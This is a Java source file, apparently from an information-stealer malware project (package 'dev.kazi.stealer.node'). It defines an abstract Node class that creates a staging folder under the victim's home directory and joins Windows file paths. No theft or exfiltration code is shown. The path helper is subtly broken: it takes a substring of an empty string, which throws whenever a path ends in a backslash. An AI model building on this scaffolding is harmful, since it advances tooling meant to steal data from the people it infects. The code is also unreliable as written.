package dev.kazi.stealer.node;

import java.io.File;

public abstract class Node {

    protected final File nodePath;
    protected Category cat;
    
    public Node(final Category cat) {
        this.nodePath = this.getFolder();
        this.cat = cat;
        try {
            this.createNode();
        }
        catch (final Exception exception) {
            throw new RuntimeException(exception);
        }
    }
    
    public abstract void createNode();
    
    public File getFolder() {
        final File folder = new File(System.getProperty("user.home"), System.getProperty("user.name"));
        if (!folder.exists()) {
            folder.mkdirs();
        }
        return folder;
    }
    
    public File mergePath(final File file, final String file0) {
        String firstFile = "";
        if (file.getAbsolutePath().endsWith("\\")) {
            firstFile = firstFile.substring(0, file.getAbsolutePath().length() - 1);
        }
        else {
            firstFile = file.getAbsolutePath();
        }
        String secondFile;
        if (file0.startsWith("\\")) {
            secondFile = file0.substring(1);
        }
        else {
            secondFile = file0;
        }
        return new File(firstFile + "\\" + secondFile);
    }
}
